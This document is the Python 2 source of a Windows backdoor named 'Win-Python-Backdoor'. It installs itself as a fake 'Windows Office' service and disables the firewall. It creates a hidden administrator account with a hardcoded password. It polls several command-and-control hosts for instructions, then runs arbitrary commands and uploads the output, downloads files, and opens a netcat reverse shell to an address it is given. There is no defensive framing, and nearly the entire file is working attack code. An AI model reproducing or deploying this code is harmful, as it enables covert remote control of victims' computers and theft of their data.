import win32serviceutil
import win32service
import win32event

import servicemanager
import threading
import asyncore
import time
import sys
import os

#import Crypto
#import ecdsa
#import paramiko
import subprocess
import httplib
import requests
import urllib2
#import pycurl
from os import path, access, R_OK
from uuid import getnode as get_mac
from subprocess import Popen
#import win32ui, win32gui, win32com, pythoncom, win32con
#from win32com.client import Dispatch
#from time import sleep
#import _winreg





#Win-Python-Backdoor

#copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wofficeie.py" C:\Python27_64
#copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wofficeie.py" C:\Python27
#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie64.py" py2exe
#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie.py" py2exe
def get_macaddress(host='localhost'):
    """ Returns the MAC address of a network host, requires >= WIN2K. """
    # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/347812
    import ctypes
    import socket
    import struct
 
    # Check for api availability
    try:
        SendARP = ctypes.windll.Iphlpapi.SendARP
    except:
        raise NotImplementedError('Usage only on Windows 2000 and above')
 
    # Doesn't work with loopbacks, but let's try and help.
    if host == '127.0.0.1' or host.lower() == 'localhost':
        host = socket.gethostname()
 
    # gethostbyname blocks, so use it wisely.
    try:
        inetaddr = ctypes.windll.wsock32.inet_addr(host)
        if inetaddr in (0, -1):
            raise Exception
    except:
        hostip = socket.gethostbyname(host)
        inetaddr = ctypes.windll.wsock32.inet_addr(hostip)
 
    buffer = ctypes.c_buffer(6)
    addlen = ctypes.c_ulong(ctypes.sizeof(buffer))
    if SendARP(inetaddr, 0, ctypes.byref(buffer), ctypes.byref(addlen)) != 0:
        raise WindowsError('Retreival of mac address(%s) - failed' % host)
 
    # Convert binary data into a string.
    macaddr = ''
    for intval in struct.unpack('BBBBBB', buffer):
        if intval > 15:
            replacestr = '0x'
        else:
            replacestr = 'x'
        if macaddr != '':
            #macaddr = ':'.join([macaddr, hex(intval).replace(replacestr, '')])
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
        else:
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
 
    return macaddr.upper()

try:
    CREATE_NO_WINDOW = 0x08000000
    swin=os.getenv('windir')
    suser=os.getenv('USERPROFILE')
    if not os.path.exists('c:\\windows\\wup.exe'):
        
    ##    f = urllib2.urlopen("http://certificates.ddns.net/wofficeie.exe")
    ##    with open(swin+'\\wup.exe',"wb") as code:
    ##        code.write(f.read())
        #os.system('powershell -Command Invoke-WebRequest -Uri "http://54.218.80.188/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
        #while not os.path.exists('c:\\windows\\wup.exe'):
        #    time.sleep(5)
        #subprocess.call("move "+swin+'\\wofficeie.exe '+swin+'\\wup.exe', creationflags=0x08000000)
        #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\wofficeie.exe " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
        subprocess.call("cmd /c copy /y "+sys.argv[0]+" " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
        subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
        subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
    subprocess.call("net start wup", creationflags=0x08000000)
    #myloop()
except Exception,e:
    print str(e)
class AppServerSvc (win32serviceutil.ServiceFramework):
    _svc_name_ = "wofficeie"
    _svc_display_name_ = "Windows Office"

    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop = win32event.CreateEvent(None,0,0,None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
    def SvcDoRun(self):
        #print getProxy()
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        myloop()
def myloop():
    sinit='0'
    site="paner.altervista.org"
    site1="paner.altervista.org"
    site2="52.26.124.145"
    site3="certificates.ddns.net"
    #os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
    #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
    
    while True:
        
        
        try:
                
                if sinit == '0':
                        #os.system("net.exe user Administrator /active:yes")
                        os.system("net.exe user asp Qwerty12 /add")
                        os.system("net.exe localgroup administrators asp /add")
                        os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f")
                        os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
                        os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
                        os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
                        os.system("netsh advfirewall set allprofiles state off")
##                            if not os.path.exists('c:\\windows\\wup.exe'):
##                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
##                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
##                                    subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
                        if not os.path.exists('c:\\windows\\syswow64'):
                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f')
                        else:
                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64')
                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64')
                                #os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64')
                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64')
                        
                        
                        #os.system("net.exe user Administrator Qwerty12")
                        os.system("net.exe user asp Qwerty12")
                        sinit='1'
                httpServ = httplib.HTTPConnection(site, 80)
                httpServ.connect()
                mymac = get_mac()
                smacaddress = get_macaddress('localhost')
                sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                sTime=time.ctime(os.path.getmtime(os.getenv('windir')+"\\wup.exe"))
                sTime=sTime.replace(" ","_")
                #opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS4, '52.26.124.145', 8080))
                #response = opener.open("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime).read()
                #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)#+"&dump=aaaaa")
                httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
                response = httpServ.getresponse()
                #sresponse=response.read()
                if response.status == httplib.OK:
                #if sresponse!= '':
                        print "Output from HTML request"
                        sresponse = response.read()
                        ifind=sresponse.find('ip=')
                        sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                        ifind=sresponse.find('port=')
                        sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                        ifind=sresponse.find('kill=')
                        skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                        ifind=sresponse.find('iout=')
                        sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                        ifind=sresponse.find('exec=')
                        sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                        ifind=sresponse.find('cmd=')
                        scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                        print skill
                else:
                        if site == site1:
                            site=site2
                        elif site == site2:
                            site=site3
                        elif site == site3:
                            site=site1
                        httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
                        response = httpServ.getresponse()
                        if response.status == httplib.OK:
                            print "Output from HTML request"
                            sresponse = response.read()
                            ifind=sresponse.find('ip=')
                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                            ifind=sresponse.find('port=')
                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('kill=')
                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('iout=')
                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('exec=')
                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('cmd=')
                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                            print skill
                        
                httpServ.close()
                if sexec == '1':
                        sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                        try:
                            if sout == '1':
                                sdump=subprocess.check_output(scmd,stderr=subprocess.STDOUT, shell=True)
##                                    process=subprocess.Popen(scmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT, shell=True)
##                                    p = Popen(scmd,shell=True)
##                                    returncode = process.wait()
##                                    print('return code'.format(returncode))
##                                    sdump=process.stdout.read()
                                text_file = open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, "w")
                                text_file.write(sdump)
                                text_file.close()
                                files = {'userfile': open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, 'rb')}
                                r = requests.post('http://' + site +'/upload.php',files=files)     
                                #if len(sdump)<2006:
                                #sdump = sdump.replace("\'", "")
                                #sdump = sdump.replace("\\", "\\\\")
                                sdump = sdump.replace("\r\n", "<br>")
                                #sdump = sdump.replace("\n", "<br>")
                                #sdump = sdump.replace("\r", "<br>")
                                sdump = sdump.replace(" ", "%20")
                                #sdump = sdump[ 0 : 2005]
                                httpServ = httplib.HTTPConnection(site, 80)
                                httpServ.connect()
                                #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                                httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                                response = httpServ.getresponse()
                                httpServ.close()
                                                                   
                            else:
                                igetfile=scmd.find('getfile')
                                ifile=scmd.rfind('/')
                                if igetfile==0:
                                    geturl =scmd[8:len(scmd)]
                                    
                                    sfiledest= scmd[ifile+1:len(scmd)]
                                    
                                    f = urllib2.urlopen(geturl)
                                    with open(swin+'\\'+ sfiledest, "wb") as code:
                                        code.write(f.read())
                                else:
                                    p = Popen(scmd,shell=True)
                            #print r.text
                        except Exception,e:
                            print str(e)
                        httpServ = httplib.HTTPConnection(site, 80)
                        httpServ.connect()
                        #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                        httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                        response = httpServ.getresponse()
                        httpServ.close()
                if skill == '0':
                        try:
                            if not os.path.exists('c:\windows\syswow64'):
                                    p = Popen("nc.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                    #os.system("nc.exe -e cmd.exe "+sip+" "+sport)
                            else:
                                    p = Popen("nc64.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                    #os.system("nc64.exe -e cmd.exe "+sip+" "+sport)
                        except Exception,e:
                            print str(e)
                        httpServ = httplib.HTTPConnection(site, 80)
                        httpServ.connect()
                        #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                        httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                        response = httpServ.getresponse()
                        httpServ.close()
                        
##                                        client = paramiko.SSHClient()                                        
##                                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
##                                        #label .myLabel
##                                        #try:
##                                        #sip = '184.72.89.74'
##                                        try:
##                                            client.connect(sip, username='root', password='toor',port=int(sport))
##                                            chan = client.get_transport().open_session()
##                                            chan.send('Hey i am connected :) ')
##                                            print chan.recv(1024)
##                                            while True:
##                                                command = chan.recv(1024)
##                                                print str(len(command))
##                                                print command
##                                                if command == 'exit' or len(command) == 0:
##                                                    
##                                                    client.close()
##                                                    break
##                                                try:
##                                                    CMD = subprocess.check_output(command, shell=True)
##                                                    chan.send(CMD)
##                                                except Exception,e:
##                                                    chan.send(str(e))
##                                        except Exception,e:
##                                            print str(e)
                site=site1
        except Exception,e:
                print str(e)
                #print e.errno
                #if e.errno == 11001:                        
                if site == site1:
                    site=site2
                elif site == site2:
                    site=site3
                elif site == site3:
                    site=site1
        time.sleep(5)

